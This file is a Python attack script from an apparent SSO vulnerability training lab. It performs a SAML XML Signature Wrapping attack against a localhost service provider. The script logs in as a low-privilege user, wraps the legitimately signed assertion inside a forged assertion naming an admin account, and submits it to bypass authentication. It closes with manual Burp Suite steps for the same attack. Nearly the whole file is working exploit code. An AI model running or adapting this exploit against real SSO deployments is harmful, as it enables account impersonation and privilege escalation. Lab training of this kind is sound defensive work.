#!/usr/bin/env python3
"""
==============================================================
 SSO Vuln Lab — Attack Script: Lab 1 — XML Signature Wrapping
==============================================================
 Target:  http://localhost:3000/lab1/acs
 Goal:    Authenticate as alice@lab.local (admin) while only
          having credentials for hacker@attacker.com (user)
 Impact:  Full privilege escalation / authentication bypass
 CVSSv3:  9.8 (Critical)

 Real-world reports:
   HackerOne #409237 - SAML Auth bypass via XSW
   HackerOne #812064 - XML Signature Wrapping in SSO

 References:
   https://research.aurainfosec.io/bypassing-saml20-SSO/
   https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-1.pdf

 Attack flow:
   1. Login as hacker@attacker.com → get legitimate signed assertion
   2. Parse the SAMLResponse — extract the signed <Assertion>
   3. Craft XSW payload:
        <EvilAssertion ID="_evil">
          <NameID>alice@lab.local</NameID>  ← injected admin
          <Attribute role="admin"/>
          <RealAssertion ID="_real">        ← legitimately signed
            <NameID>hacker@attacker.com</NameID>
            <Signature URI="#_real">...</Signature>
          </RealAssertion>
        </EvilAssertion>
   4. POST crafted SAMLResponse to /lab1/acs
   5. SP verifies signature on _real (passes!), reads NameID
      from root.findall('.//NameID')[0] → gets alice@lab.local
==============================================================
"""

import sys, base64, uuid, time, requests
from lxml import etree
from urllib.parse import urlencode, urlparse, parse_qs

SP_URL  = "http://localhost:3000"
IDP_URL = "http://localhost:8080"

HACKER_EMAIL    = "hacker@attacker.com"
HACKER_PASSWORD = "hack123"
TARGET_EMAIL    = "alice@lab.local"    # admin account to impersonate
TARGET_ROLE     = "admin"

NS = {
    "saml":  "urn:oasis:names:tc:SAML:2.0:assertion",
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "ds":    "http://www.w3.org/2000/09/xmldsig#",
}

BANNER = """
╔══════════════════════════════════════════════════════╗
║  LAB 1 — XML Signature Wrapping (XSW) Attack        ║
║  Target: alice@lab.local (admin)                    ║
╚══════════════════════════════════════════════════════╝
"""

def step(n, msg):
    print(f"\n[STEP {n}] {msg}")

def info(msg):
    print(f"  [*] {msg}")

def success(msg):
    print(f"  [✓] {msg}")

def fail(msg):
    print(f"  [✗] {msg}")
    sys.exit(1)

# ── Step 1: Get a legitimate SAML assertion for hacker ───────
def get_legitimate_assertion():
    """
    Perform real SAML login as hacker@attacker.com.
    Returns base64-encoded SAMLResponse.
    """
    session = requests.Session()

    step(1, f"Initiating SAML flow as {HACKER_EMAIL}")

    # Visit SP lab1 login → redirected to IdP
    r = session.get(f"{SP_URL}/lab1/login", allow_redirects=False)
    if r.status_code not in (301, 302):
        fail(f"Expected redirect from SP, got {r.status_code}")

    idp_redirect = r.headers.get("Location","")
    info(f"SP redirected to IdP: {idp_redirect[:80]}...")

    # Follow redirect to IdP login page
    r2 = session.get(idp_redirect)
    if r2.status_code != 200:
        fail(f"IdP login page failed: {r2.status_code}")
    success("Fetched IdP login page")

    # Extract SAMLRequest + RelayState from form
    root_html = etree.fromstring(r2.content,
                                  parser=etree.HTMLParser())
    saml_req = ""
    relay    = ""
    for inp in root_html.findall('.//input'):
        n = inp.get("name","")
        v = inp.get("value","")
        if n == "SAMLRequest": saml_req = v
        if n == "RelayState":  relay    = v

    # Submit credentials to IdP
    step(2, "Submitting hacker credentials to IdP")
    r3 = session.post(f"{IDP_URL}/saml/sso", data={
        "email":       HACKER_EMAIL,
        "password":    HACKER_PASSWORD,
        "SAMLRequest": saml_req,
        "RelayState":  relay,
    }, allow_redirects=False)
    info(f"IdP responded: {r3.status_code}")

    # IdP returns auto-submit HTML form with SAMLResponse
    # Parse SAMLResponse from the HTML body
    form_html = r3.text if r3.status_code == 200 else ""

    # If we got redirected, follow
    if r3.status_code in (301,302):
        r3 = session.get(r3.headers["Location"])
        form_html = r3.text

    if "SAMLResponse" not in form_html:
        # Try posting to IdP directly
        r3b = session.post(f"{IDP_URL}/saml/sso", data={
            "email":    HACKER_EMAIL,
            "password": HACKER_PASSWORD,
        })
        form_html = r3b.text

    # Extract SAMLResponse from auto-submit form
    tree = etree.fromstring(form_html.encode(), parser=etree.HTMLParser())
    saml_resp_b64 = ""
    acs_url       = ""
    for inp in tree.findall('.//input'):
        n = inp.get("name","")
        v = inp.get("value","")
        if n == "SAMLResponse": saml_resp_b64 = v
    for form in tree.findall('.//form'):
        acs_url = form.get("action","")

    if not saml_resp_b64:
        # Use capture endpoint as fallback
        info("Trying capture endpoint as fallback...")
        r_cap = session.post(f"{SP_URL}/lab1/login")
        fail("Could not extract SAMLResponse — check IdP/SP connectivity")

    success(f"Captured SAMLResponse ({len(saml_resp_b64)} chars)")
    success(f"ACS URL: {acs_url}")
    return saml_resp_b64, acs_url

# ── Step 2: Craft XSW Payload ─────────────────────────────────
def craft_xsw_payload(original_b64):
    """
    Wrap the real signed assertion in an evil outer assertion.
    The evil outer assertion has:
      - NameID = alice@lab.local (admin)
      - Attribute role = admin

    The real signed assertion (for hacker@attacker.com) is
    nested INSIDE the evil assertion.

    SP behavior (vulnerable):
      1. Finds ds:Signature anywhere in tree
      2. Reference URI="#_real" → finds inner assertion
      3. Verifies signature → PASSES (it's legitimately signed)
      4. Reads root.findall('.//NameID')[0]
         → gets alice@lab.local from OUTER evil assertion
    """
    step(3, "Crafting XSW payload")

    xml_bytes = base64.b64decode(original_b64)
    original  = etree.fromstring(xml_bytes)

    # Get the signed Assertion element
    assertion_el = original.find(".//saml:Assertion", NS)
    if assertion_el is None:
        fail("No Assertion in SAMLResponse")

    real_id = assertion_el.get("ID","_real")
    info(f"Real assertion ID: {real_id}")
    info(f"Real NameID: {assertion_el.findtext('.//saml:NameID', namespaces=NS)}")

    # Build evil outer assertion
    evil_id = "_evil_" + uuid.uuid4().hex[:8]
    evil_xml = f"""<saml:Assertion
      xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
      ID="{evil_id}"
      IssueInstant="2024-01-01T00:00:00Z"
      Version="2.0">
  <saml:Issuer>http://saml-idp:8080/saml/metadata</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{TARGET_EMAIL}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData
        NotOnOrAfter="2099-01-01T00:00:00Z"
        Recipient="http://localhost:3000/lab1/acs"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
    <saml:AudienceRestriction>
      <saml:Audience>http://vulnerable-saml-sp:3000</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AttributeStatement>
    <saml:Attribute Name="email">
      <saml:AttributeValue>{TARGET_EMAIL}</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="role">
      <saml:AttributeValue>{TARGET_ROLE}</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="displayName">
      <saml:AttributeValue>Alice Admin (forged)</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>"""

    evil_el = etree.fromstring(evil_xml.encode())

    # Append real signed assertion INSIDE the evil one
    evil_el.append(assertion_el)

    # Replace assertion in Response
    resp_root = etree.fromstring(xml_bytes)
    old_assert = resp_root.find(".//saml:Assertion", NS)
    if old_assert is not None:
        resp_root.remove(old_assert)
    resp_root.append(evil_el)

    # Serialize
    crafted_xml  = etree.tostring(resp_root, encoding="unicode")
    crafted_b64  = base64.b64encode(crafted_xml.encode()).decode()

    success(f"XSW payload crafted (evil ID: {evil_id}, real ID: {real_id})")
    info("Structure:")
    info(f"  Response")
    info(f"  └── EvilAssertion ID={evil_id} [NameID: {TARGET_EMAIL}]")
    info(f"      └── RealAssertion ID={real_id} [NameID: {HACKER_EMAIL}]")
    info(f"          └── Signature (covers #{real_id}) ← SP verifies this")
    info(f"  SP reads findall('.//NameID')[0] → {TARGET_EMAIL} 🎯")

    return crafted_b64, crafted_xml

# ── Step 3: Submit XSW payload ────────────────────────────────
def submit_xsw(crafted_b64, acs_url):
    step(4, f"Submitting XSW payload to ACS: {acs_url}")

    session = requests.Session()
    r = session.post(acs_url, data={
        "SAMLResponse": crafted_b64,
        "RelayState":   "lab1",
    }, allow_redirects=True)

    info(f"Response: {r.status_code} — URL: {r.url}")

    if "dashboard" in r.url or "alice" in r.text.lower():
        success("=" * 50)
        success("XSW ATTACK SUCCESSFUL!")
        success(f"Authenticated as: {TARGET_EMAIL}")
        success(f"Role: {TARGET_ROLE}")
        success("=" * 50)
        if "Admin access granted" in r.text or "admin" in r.text.lower():
            print("\n  🚨 ADMIN ACCESS CONFIRMED IN RESPONSE!")
    else:
        print(f"\n  Response body (first 500 chars):\n{r.text[:500]}")
        info("Check manually — response might show partial success")

def main():
    print(BANNER)

    # Step 1: Get real assertion
    saml_resp_b64, acs_url = get_legitimate_assertion()

    if not acs_url:
        acs_url = f"{SP_URL}/lab1/acs"

    # Step 2: Craft XSW
    crafted_b64, crafted_xml = craft_xsw_payload(saml_resp_b64)

    # Optional: show crafted XML
    if "--show-xml" in sys.argv:
        print("\n[XSW Payload XML]:")
        print(crafted_xml[:2000])

    # Step 3: Submit
    submit_xsw(crafted_b64, acs_url)

    print(f"""
╔══════════════════════════════════════════════════════╗
║  Manual Burp Alternative:                           ║
║  1. Intercept SAMLResponse in Burp Suite            ║
║  2. Install SAML Raider extension                   ║
║  3. Use XSW attack type 2 or 4 in SAML Raider       ║
║  4. Forward to SP ACS                               ║
╚══════════════════════════════════════════════════════╝
""")

if __name__ == "__main__":
    main()
